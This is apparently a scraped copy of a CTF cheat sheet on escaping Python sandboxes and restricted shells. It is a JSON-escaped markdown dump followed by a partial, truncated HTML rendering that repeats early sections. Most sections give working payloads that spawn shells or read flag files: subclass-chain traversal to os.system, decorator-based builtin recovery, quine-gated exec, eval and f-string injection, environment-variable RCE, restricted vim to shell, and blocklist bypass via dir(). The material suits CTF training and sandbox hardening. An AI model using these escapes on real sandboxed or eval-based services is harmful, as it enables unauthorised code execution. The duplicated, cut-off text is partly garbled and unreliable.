Names","```python","import string","for c in string.printable:","    result = test(f\"{c}(65)\")","    if \"unknown function\" not in result:","        print(f\"FOUND: {c}()\")","```","","---","","## Oracle-Based Challenges","","**Common functions:** `L()`, `Q(i, x)`, `S(guess)`","- `L()` = length of secret","- `Q(i, x)` = compare position i with value x","- `S(guess)` = submit answer","","### Binary Search","```python","def find_char(i):","    lo, hi = 32, 127","    while lo \u003c hi:","        mid = (lo + hi) // 2","        cmp = query(i, mid)","        if cmp == 0:","            return chr(mid)","        elif cmp == -1:  # mid \u003c flag[i]","            lo = mid + 1","        else:","            hi = mid - 1","    return chr(lo)","","flag_len = int(test(\"L()\"))","flag = ''.join(find_char(i) for i in range(flag_len))","```","","### Linear Search","```python","for i in range(flag_len):","    for c in range(32, 127):","        if query(i, c) == 0:","            flag += chr(c)","            break","```","","---","","## Building Strings Without Concat","","```python","# Hex escapes","\"'\\\\x66\\\\x6c\\\\x61\\\\x67'\"  # =\u003e 'flag'","","def to_hex_str(s):","    return \"'\" + ''.join(f'\\\\x{ord(c):02x}' for c in s) + \"'\"","```","","---","","## Classic Escape Techniques","","### Via Class Hierarchy","```python","''.__class__.__mro__[1].__subclasses__()","# Find \u003cclass 'os._wrap_close'\u003e","```","","### Compile Bypass","```python","exec(compile('__import__(\"os\").system(\"sh\")', '', 'exec'))","```","","### Unicode Bypass","```python","ｅｖａｌ = eval  # Fullwidth characters","```","","### Getattr Alternatives","```python","\"{0.__class__}\".format('')","vars(''.__class__)","```","","---","","## Walrus Operator Reassignment","","```python","# Reassign constraint variable","(abcdef := \"all_allowed_letters\")","```","","### Octal Escapes","```python","# \\141 = 'a', \\142 = 'b', etc.","all_letters = '\\141\\142\\143...'","(abcdef := \"{all_letters}\")","print(open(\"/flag.txt\").read())","```","","---","","## Magic Comment Escape","","```python","# -*- coding: raw_unicode_escape -*-","\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074 os","```","","**Useful encodings:**","- `utf-7`","- `raw_unicode_escape`","- `rot_13`","","---","","## Mastermind-Style Jails","","**Output interpretation:**","```text","function(\"aaa...\") =\u003e \"1 0\"  # 1 exists wrong pos, 0 correct","```","","### Find Input Length","```python","for length in range(1, 50):","    result = test('a' * length)","    print(f\"len={length}: {result}\")","```","","### Find Characters","```python","for c in charset:","    result = test(c * SECRET_LEN)","    if result[0] + result[1] \u003e 0:","        print(f\"{c}: count={result[0] + result[1]}\")","```","","### Find Positions","```python","known = \"\"","for pos in range(SECRET_LEN):","    for c in candidate_chars:","        test_str = known + c + 'Z' * (SECRET_LEN - len(known) - 1)","        result = test(test_str)","        if result[1] \u003e len(known):","            known += c","            break","```","","---","","## Server Communication","","```python","from pwn import *","context.log_level = 'error'","","def test_with_delay(cmd, delay=5):","    r = remote('host', port, timeout=20)","    r.sendline(cmd.encode())","    import time","    time.sleep(delay)","    try:","        return r.recv(timeout=3).decode()","    except:","        return None","    finally:","        r.close()","```","","---","","## Magic File ReDoS","","**Evil magic file:**","```text","0 regex (a+)+$ Vulnerable pattern","```","","**Timing oracle:**","```python","def measure(payload):","    start = time.time()","    requests.post(URL, data={'magic': payload})","    return time.time() - start","```","","---","","## Environment Variable RCE","","```bash","PYTHONWARNINGS=ignore::antigravity.Foo::0","BROWSER=\"/bin/sh -c 'cat /flag' %s\"","```","","**Other dangerous vars:**","- `PYTHONSTARTUP` - executed on interactive","- `PYTHONPATH` - inject modules","- `PYTHONINSPECT` - drop to shell","","---","","## Decorator-Based Escape (No Call, No Quotes, No Equals)","","**Pattern (Ergastulum):** `ast.Call` banned, no quotes, no `=`, no commas, charset `a-z0-9()[]:._@\\n`. Exec context has `__builtins__={}` and `__loader__=_frozen_importlib.BuiltinImporter`.","","**Key insight:** Decorators bypass `ast.Call` — `@expr` on `def name(): body` compiles to `name = expr(func)`, calling `expr` without an `ast.Call` node. This also provides assignment without `=`.","","### Technique 1: `function.__name__` as String Keys","","Define a function to create a string matching a dict key:","```python","def __builtins__():   # __builtins__.__name__ == \"__builtins__\"","    0","def exec():           # exec.__name__ == \"exec\"","    0","```","Use as dict subscript: `some_dict[exec.__name__]` accesses `some_dict[\"exec\"]`.","","### Technique 2: Name Extractor via getset_descriptor","","`function_type.__dict__['__name__'].__get__` takes a function and returns its `.__name__` string. This enables chained decorators:","","```python","@dict_obj.__getitem__        # Step 2: dict[\"key_name\"] → value","@func.__class__.__dict__[__name__.__name__].__get__  # Step 1: extract .__name__","def key_name():              # function with __name__ == \"key_name\"","    0","# Result: key_name = dict_obj[\"key_name\"]","```","","### Technique 3: Accessing Real Builtins via __loader__","","```python","__loader__.load_module.__func__.__globals__[\"__builtins__\"]","```","Contains real `exec`, `__import__`, `print`, `compile`, `chr`, `type`, `getattr`, `setattr`, etc.","","### Full Exploit Chain","","```python","# Step 1: Define helper functions for string key extraction","def __builtins__():","    0","def __name__():","    0","def __import__():","    0","","# Step 2: Extract real __import__ from loader's globals","# Equivalent to: __import__ = globals_dict[\"__builtins__\"][\"__import__\"]","@__loader__.load_module.__func__.__globals__[__builtins__.__name__].__getitem__","@__builtins__.__class__.__dict__[__name__.__name__].__get__","def __import__():","    0","","# Step 3: Import os module","# Equivalent to: os = __import__(\"os\")","@__import__","@__builtins__.__class__.__dict__[__name__.__name__].__get__","def os():","    0","","# Step 4: Get a shell","# Equivalent to: sh = os.system(\"sh\")","@os.system","@__builtins__.__class__.__dict__[__name__.__name__].__get__","def sh():","    0","```","","### How the Decorator Chain Works (Bottom-Up)","","```python","@outer_func","@inner_func","def name():","    0","```","Executes as: `name = outer_func(inner_func(function_named_name))`","","For the `__import__` extraction:","1. `__builtins__.__class__` → `\u003cclass 'function'\u003e` (type of our defined function)","2. `.__dict__[__name__.__name__]` → `function.__dict__[\"__name__\"]` → getset_descriptor","3. `.__get__` → descriptor's getter (takes function, returns its `.__name__` string)","4. Applied to `def __import__(): 0` → returns string `\"__import__\"`","5. `globals_dict[\"__builtins__\"].__getitem__(\"__import__\")` → real `__import__` function","","### Variations","","**Execute arbitrary code via exec + code object:**","```python","def __code__():","    0","@exec_function","@__builtins__.__class__.__dict__[__code__.__name__].__get__","def payload():","    ... # code to execute (still subject to charset/AST restrictions)","```","","**Import any module by name:**","```python","@__import__","@__builtins__.__class__.__dict__[__name__.__name__].__get__","def subprocess():  # or any valid module name using allowed chars","    0","```","","### Constraints Checklist for This Technique","","- [x] No `ast.Call` nodes (decorators are `ast.FunctionDef` with decorator_list)","- [x] No quotes (strings from `function.__name__`)","- [x] No `=` sign (decorators provide assignment)","- [x] No commas (single-argument decorator calls)","- [x] No `+`, `*`, operators (pure attribute/subscript chains)","- [x] Works with empty `__builtins__` (accesses real builtins via `__loader__`)","","### When __loader__ Is Not Available","","If `__loader__` isn't in scope but you have any function object `f`:","- `f.__class__` → function type","- `f.__globals__` → module globals where `f` was defined","- `f.__globals__[\"__builtins__\"]` → real builtins (if `f` is from a normal module)","","If you have a class `C`:","- `C.__init__.__globals__` → globals of the module defining `C`","","**References:** 0xL4ugh CTF 2025 \"Ergastulum\" (442pts, Elite), GCTF 2022 \"Treebox\"","","---","","## Quine + Context Detection for Code Execution (BearCatCTF 2026)","","**Pattern (The Boy is Quine):** Server asks for a quine (program that prints its own source code), validates it by running in a subprocess, then `exec()`s it in the main process with different globals.","","**Exploit:** Build a dual-purpose quine that:","1. Prints itself (passes quine validation in subprocess)","2. Executes payload only in the server process (detected via globals difference)","","```python","# Context gate: \"subprocess\" module exists in server globals but not in subprocess","s='s=%r;print(s%%s,end=\"\");__import__(\"os\").system(\"cat /app/flag.txt\")if\"subprocess\"in globals()else 0';print(s%s,end=\"\");__import__(\"os\").system(\"cat /app/flag.txt\")if\"subprocess\"in globals()else 0","```","","**Key insight:** `exec()` in the server process inherits the server's globals (imported modules like `subprocess`), while the subprocess validation has a clean environment. Use `\"module_name\" in globals()` or `\"module_name\" in dir()` as a gate to distinguish contexts. The quine structure `s='s=%r;...';print(s%s,end=\"\")` is the classic Python quine pattern.","","---","","## Restricted Character Repunit Decomposition (BearCatCTF 2026)","","**Pattern (The Brig):** Pick exactly 2 characters for your entire expression. Server evaluates `eval(long_to_bytes(eval(expr)))` — the outer eval runs the decoded Python code.","","**Strategy:** Choose `1` and `+`. Decompose the target integer into a sum of repunits (111, 1111, 11111, etc.):","```python","from Crypto.Util.number import bytes_to_long","","target = bytes_to_long(b'eval(input())')  # → 13-byte integer","","def repunit(k):","    return (10**k - 1) // 9  # 111...1 with k digits","","terms = []","remaining = target","while remaining \u003e 0:","    k = 1","    while repunit(k + 1) \u003c= remaining:","        k += 1","    terms.append('1' * k)","    remaining -= repunit(k)","","expr = '+'.join(terms)  # e.g., \"111...1+111...1+11+1+1\"","# len(expr) ≈ 2561 chars (fits 4096 limit)","```","","**Key insight:** Any positive integer can be written as a sum of repunits (numbers like 1, 11, 111, ...). The greedy algorithm produces ~O(log²(n)) terms. This converts a 2-character constraint into arbitrary code execution via `long_to_bytes()`. On the second unrestricted prompt, run `open('/flag.txt').read()`.","","**Detection:** Challenge restricts input character set to exactly 2 characters. Double-eval pattern (`eval(decode(eval(...)))`).","","---","","## Python eval() Jail Escape via Tuple Injection (Codegate 2018)","","When the server does `eval(\"your.\" + input + \"()\")`, inject a tuple to execute arbitrary code:","","```python","# Server code: eval(\"your.\" + user_input + \"()\")","# Inject: dig(),eval(eval('raw\\x5finput()')),","# Becomes: eval(\"your.dig(),eval(eval('raw\\x5finput()')),()\") ","# = tuple of (your.dig(), eval(arbitrary), None)","","# Alternative: inject payload via Name variable during registration","# Name = \"__import__('os').system('/bin/sh')\"","# Input: dig(),eval(name),exit","# eval(\"your.dig(),eval(name),exit()\") -\u003e executes payload from name","```","","**Key insight:** Python `eval()` on a comma-separated expression creates a tuple, allowing multiple expressions to execute. `\\x5f` hex escapes bypass underscore blacklists. When direct code injection is blocked, store payload in a variable (registration name, environment) and reference it via `eval(varname)` in the eval context. The general pattern: if the server wraps your input in `eval(\"prefix\" + input + \"suffix\")`, use commas to break out of the intended expression and inject additional expressions as tuple elements.","","---","","## Python f-string Config Injection via Stored eval (INShAck 2018)","","**Pattern:** A config creator uses Python f-strings to render values. Store a payload as one config value, then reference it from another using eval(). Register key \"a\" with value `__import__(\"os\").system(\"cat flag\")`, then key \"eval(a)\" with value \"{}\".","","```python","# Step 1: Store payload as config value","register_key(\"a\", '__import__(\"os\").system(\"cat flag.txt\")')","","# Step 2: Create key whose name is eval(a) with empty format placeholder","register_key(\"eval(a)\", \"{}\")","","# Step 3: When config renders f\"eval(a) = {value}\",","# the f-string evaluates eval(a) in the key position,","# executing the stored payload","show_config()  # triggers f-string rendering -\u003e RCE","```","","**Key insight:** Python f-strings evaluate expressions in curly braces at render time. If config keys or values are rendered in f-strings, storing `eval(stored_key)` as a key name causes arbitrary code execution when the config is displayed. Two-step: store payload as value, reference via eval in key name.","","---","","## Hints Cheat Sheet","","| Hint | Meaning |","|------|---------|","| \"I love chars\" | Single-char functions |","| \"No words\" | Multi-char blocked |","| \"Oracle\" | Query functions to leak |","| \"knight/chess\" | Mastermind game |","","---","","## func_globals to Module Chain Traversal (PlaidCTF 2013)","","**Pattern:** Access `os.system` through the `func_globals` dictionary of a loaded class's method, without importing any modules.","","```python","# Step 1: Find catch_warnings in subclass list (commonly index 49 or 59)","[x for x in ().__class__.__base__.__subclasses__()","    if x.__name__ == \"catch_warnings\"][0]","","# Step 2: Access func_globals via __init__ or __repr__","g = ().__class__.__base__.__subclasses__()[59].__init__.func_globals","# Python 2: .__init__.im_func.func_globals","# Python 3: .__init__.__globals__","","# Step 3: Traverse module chain: warnings → linecache → os","g[\"linecache\"].__dict__[\"os\"].system(\"cat /flag.txt\")","","# One-liner:","().__class__.__base__.__subclasses__()[59].__init__.__globals__[\"linecache\"].__dict__[\"os\"].system(\"id\")","```","","**Key insight:** The `warnings.catch_warnings` class is almost always loaded. Its `__init__.__globals__` contains a reference to `linecache`, which imports `os`. This chain avoids direct `import` statements. The subclass index varies by Python version — enumerate with `[(i,x.__name__) for i,x in enumerate(''.__class__.__mro__[1].__subclasses__())]`.","","---","","## Restricted Charset Number Generation (PlaidCTF 2013)","","**Pattern:** Generate arbitrary integers using only `~` (bitwise NOT), `\u003c\u003c` (left shift), `[]\u003c[]` (False=0), and `{}\u003c[]` (True=1) when numeric literals are forbidden.","","```python","def brainfuckize(nb):","    \"\"\"Convert integer to expression using only ~, \u003c\u003c, \u003c, [], {}\"\"\"","    if nb == -2: return \"~({}\u003c[])\"    # ~True = -2","    if nb == -1: return \"~([]\u003c[])\"    # ~False = -1","    if nb == 0:  return \"([]\u003c[])\"     # False = 0","    if nb == 1:  return \"({}\u003c[])\"     # True = 1","    if nb % 2:   return f\"~{brainfuckize(~nb)}\"  # Odd: ~(complement)","    return f\"({brainfuckize(nb//2)}\u003c\u003c({{}}\u003c[]))\"   # Even: half \u003c\u003c 1","","# brainfuckize(65) → \"(~(~([]\u003c[]))\u003c\u003c({}\u003c[]))\u003c\u003c({}\u003c[]))\u003c\u003c({}\u003c[]))\u003c\u003c({}\u003c[]))\u003c\u003c({}\u003c[]))\u003c\u003c({}\u003c[]))\"","# Then use: \"%c\" % 65 → \"A\"","```","","**Key insight:** Combine with `\"%c\" % ascii_value` to build arbitrary strings character by character. This bypasses jails that strip all alphanumeric characters while allowing operators and brackets.","","---","","## Python Name Mangling and Attribute Access (Tokyo Westerns 2017)","","Three sandbox escape vectors that exploit Python's name visibility model.","","**1. Name mangling bypass:** Python \"private\" `__method` names in a class are stored as `_ClassName__method`. They are accessible via `dir()` and `getattr()` — not truly private.","","```python","# Name mangling bypass","getattr(obj, dir(obj)[0])()  # calls _ClassName__method","```","","**2. Function constant leakage:** All string literals inside a function body are stored in `func_code.co_consts` (Python 2) or `__code__.co_consts` (Python 3) and are readable from outside.","","```python","# func_code local variable leak (Python 2)","func.func_code.co_consts  # reveals all string literals in function","","# Python 3 equivalent","func.__code__.co_consts","```","","**3. Module docstring as data store:** Module-level triple-quoted strings become `module.__doc__`, readable without needing file access.","","```python","# Module docstring access","import target_module","target_module.__doc__  # reads module-level triple-quoted string","```","","**Key insight:** Python `__` prefix is name-mangled, not truly private — `dir(obj)` + `getattr()` bypass it. `func_code.co_consts` exposes all literal constants defined inside a function. Module docstrings are always readable as `__doc__` without file access.","","---","","## Multi-Stage Payload with Class Attribute Persistence (PlaidCTF 2013)","","**Pattern:** Store intermediate code fragments across multiple jail submissions by writing to class attributes of subclasses.","","```python","# Stage 1: Store code fragment on a subclass","().__class__.__base__.__subclasses__()[-2].payload = \"import os; os.system('cat /flag.txt')\"","","# Stage 2 (next submission): Retrieve and execute","exec(().__class__.__base__.__subclasses__()[-2].payload)","```","","**Key insight:** Class attributes persist across separate `eval()`/`exec()` calls within the same process. If the jail limits input length but allows multiple submissions, split the payload across submissions using subclass attributes as storage. Use `IncrementalDecoder` or any persistent subclass as the storage target.","","---","","## Restricted vim Escape via K (man) to :!sh (TokyoWesterns CTF 4th 2018)","","**Pattern (shrine):** Sandbox launches a locked-down `vim` with `:shell`/`:!` mapped out and a secure-mode profile. Command-mode escapes are blocked, but normal-mode `K` (look up keyword under cursor via `keywordprg`, default `man`) still works. `man` internally paginates via `less`, and `less` itself has a documented shell-escape: typing `!sh` from the pager spawns a shell with the user's real privileges.","","**Exploit steps:**","1. Open any file in the restricted vim (or create one inline with `vim -c 'new' -c 'put! =\\\"ls\\\"'`).","2. In normal mode, place the cursor on any identifier and press `K`. vim runs `man \u003cword\u003e`.","3. `man` pipes output to `less`. Inside `less`, press `!sh` and hit Enter — the pager fork/execs a real shell.","4. Alternatively, once inside `less` type `v` to launch `$EDITOR`; if `EDITOR=vim` is unset the default editor still allows shell escape via `:!`.","","```text","vim file.txt        # restricted vim opens","(cursor on \"ls\")","K                   # runs `man ls` → pager `less`","!sh                 # less shell-escape → real shell","```","","**Hardening signals to check first:** `keywordprg` value (`:set keywordprg?`), `secure` mode, whether `shell` option has been cleared, and the `LESSSECURE=1` environment variable. `LESSSECURE=1` specifically disables `!`, `|`, `v`, and `s` inside `less` — its absence is a green light for this escape.","","**Key insight:** Restricted editors almost always leak via chained pagers and keyword lookups. Catalog every command that spawns a child process (`K`/`keywordprg`, `:grep`, `:make`, `gx` for URL open, `:Man`) before touching `:!`. If even one child process uses `less` or another escape-friendly pager without `LESSSECURE=1`, you have a shell.","","**References:** TokyoWesterns CTF 4th 2018 — writeup 10859; GTFOBins `vim`/`less`/`man` entries","","---","","## dir() Attribute Lookup Escape Bypassing __class__ Blocklist (InCTF 2018)","","**Pattern:** A sandbox substring-filters literal strings `__class__`, `__bases__`, `__subclasses__`, `eval`, and `import`, but `dir(obj)` is allowed and returns the attribute names as strings. Use `dir([])` to look up forbidden attribute names by index, then chain `getattr` calls to reach `object.__subclasses__()` without ever typing the blocked literals.","","```python","# Blacklist: \"__class__\", \"__subclasses__\", \"eval\", \"import\", \"exec\"","# Allowed: dir(), getattr(), list literals, integer literals","","# Step 1: find the index of \"__class__\" in dir([])","# dir([]) == ['__add__', '__class__', '__contains__', ...]","i_class = 1","base_attr = 34           # index of \"__subclasses__\" in dir(getattr([], dir([])[1]))","","# Step 2: chain getattr with indexed dir() lookups","cls       = getattr([],  dir([])[i_class])           # list.__class__","base      = getattr(cls, dir(cls)[dir(cls).index(\"__base__\")])   # object","subs      = getattr(base, dir(base)[base_attr])()    # list of all classes","","# Step 3: find a useful class — often subprocess.Popen","for klass in subs:","    if \"Popen\" in getattr(klass, dir(klass)[dir(klass).index(\"__name__\")]):","        break","klass([\"/bin/sh\", \"-c\", \"cat flag\"])","```","","**Key insight:** `dir()` is a *data* function: it returns plain strings. A substring blocklist scanning the source never sees the blocked words because they are generated at runtime from attribute table bytes. Any Python jail that filters source text without AST walking is defeated by one layer of indirection — `dir`, `globals().get(key)`, or `vars(obj)[key]`. When auditing a jail, always ask: \"does the filter see the literal or the *value*?\". If it only sees the literal, `dir()` indexing is the shortest escape.","","**References:** InCTF 2018 — The Most Secure File Uploader, writeup <div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Identifying Jail Type</h2><a id="user-content-identifying-jail-type" class="anchor" aria-label="Permalink: Identifying Jail Type" href="#identifying-jail-type"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><strong>Error patterns reveal filtering:</strong></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Error Pattern</th>
<th>Meaning</th>
<th>Approach</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>name not allowed: X</code></td>
<td>Identifier blacklist</td>
<td>Unicode, hex escapes</td>
</tr>
<tr>
<td><code>unknown function: X</code></td>
<td>Function whitelist</td>
<td>Brute-force names</td>
</tr>
<tr>
<td><code>node not allowed: X</code></td>
<td>AST filtering</td>
<td>Avoid blocked syntax</td>
</tr>
<tr>
<td><code>binop types must be int/bool</code></td>
<td>Type restrictions</td>
<td>Use int operations</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>

<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Brute-Force Function Names</h3><a id="user-content-brute-force-function-names" class="anchor" aria-label="Permalink: Brute-Force Function Names" href="#brute-force-function-names"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>

    result = test(f&quot;{c}(65)&quot;)
    if &quot;unknown function&quot; not in result:

<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Oracle-Based Challenges</h2><a id="user-content-oracle-based-challenges" class="anchor" aria-label="Permalink: Oracle-Based Challenges" href="#oracle-based-challenges"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><strong>Common functions:</strong> <code>L()</code>, <code>Q(i, x)</code>, <code>S(guess)</code></p>
<ul dir="auto">
<li><code>L()</code> = length of secret</li>
<li><code>Q(i, x)</code> = compare position i with value x</li>
<li><code>S(guess)</code> = submit answer</li>
</ul>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Binary Search</h3><a id="user-content-binary-search" class="anchor" aria-label="Permalink: Binary Search" href="#binary-search"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="def find_char(i):
    lo, hi = 32, 127
    while lo &lt; hi:
        mid = (lo + hi) // 2
        cmp = query(i, mid)
        if cmp == 0:
            return chr(mid)
        elif cmp == -1:  # mid &lt; flag[i]
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)

flag_len = int(test(&quot;L()&quot;))
flag = ''.join(find_char(i) for i in range(flag_len))"><pre><span class="pl-k">def</span> <span class="pl-en">find_char</span>(<span class="pl-s1">i</span>):
    <span class="pl-s1">lo</span>, <span class="pl-s1">hi</span> <span class="pl-c1">=</span> <span class="pl-c1">32</span>, <span class="pl-c1">127</span>
    <span class="pl-k">while</span> <span class="pl-s1">lo</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">hi</span>:
        <span class="pl-s1">mid</span> <span class="pl-c1">=</span> (<span class="pl-s1">lo</span> <span class="pl-c1">+</span> <span class="pl-s1">hi</span>) <span class="pl-c1">//</span> <span class="pl-c1">2</span>
        <span class="pl-s1">cmp</span> <span class="pl-c1">=</span> <span class="pl-en">query</span>(<span class="pl-s1">i</span>, <span class="pl-s1">mid</span>)
        <span class="pl-k">if</span> <span class="pl-s1">cmp</span> <span class="pl-c1">==</span> <span class="pl-c1">0</span>:
            <span class="pl-k">return</span> <span class="pl-en">chr</span>(<span class="pl-s1">mid</span>)
        <span class="pl-k">elif</span> <span class="pl-s1">cmp</span> <span class="pl-c1">==</span> <span class="pl-c1">-</span><span class="pl-c1">1</span>:  <span class="pl-c"># mid &lt; flag[i]</span>
            <span class="pl-s1">lo</span> <span class="pl-c1">=</span> <span class="pl-s1">mid</span> <span class="pl-c1">+</span> <span class="pl-c1">1</span>
        <span class="pl-k">else</span>:
            <span class="pl-s1">hi</span> <span class="pl-c1">=</span> <span class="pl-s1">mid</span> <span class="pl-c1">-</span> <span class="pl-c1">1</span>
    <span class="pl-k">return</span> <span class="pl-en">chr</span>(<span class="pl-s1">lo</span>)

<span class="pl-s1">flag_len</span> <span class="pl-c1">=</span> <span class="pl-en">int</span>(<span class="pl-en">test</span>(<span class="pl-s">"L()"</span>))
<span class="pl-s1">flag</span> <span class="pl-c1">=</span> <span class="pl-s">''</span>.<span class="pl-c1">join</span>(<span class="pl-en">find_char</span>(<span class="pl-s1">i</span>) <span class="pl-k">for</span> <span class="pl-s1">i</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-s1">flag_len</span>))</pre></div>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Linear Search</h3><a id="user-content-linear-search" class="anchor" aria-label="Permalink: Linear Search" href="#linear-search"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="for i in range(flag_len):
    for c in range(32, 127):
        if query(i, c) == 0:
            flag += chr(c)
            break"><pre><span class="pl-k">for</span> <span class="pl-s1">i</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-s1">flag_len</span>):
    <span class="pl-k">for</span> <span class="pl-s1">c</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-c1">32</span>, <span class="pl-c1">127</span>):
        <span class="pl-k">if</span> <span class="pl-en">query</span>(<span class="pl-s1">i</span>, <span class="pl-s1">c</span>) <span class="pl-c1">==</span> <span class="pl-c1">0</span>:
            <span class="pl-s1">flag</span> <span class="pl-c1">+=</span> <span class="pl-en">chr</span>(<span class="pl-s1">c</span>)
            <span class="pl-k">break</span></pre></div>

<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Magic Comment Escape</h2><a id="user-content-magic-comment-escape" class="anchor" aria-label="Permalink: Magic Comment Escape" href="#magic-comment-escape"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="# -*- coding: raw_unicode_escape -*-
\u0069\u006d\u0070\u006f\u0072\u0074 os"><pre><span class="pl-c"># -*- coding: raw_unicode_escape -*-</span>

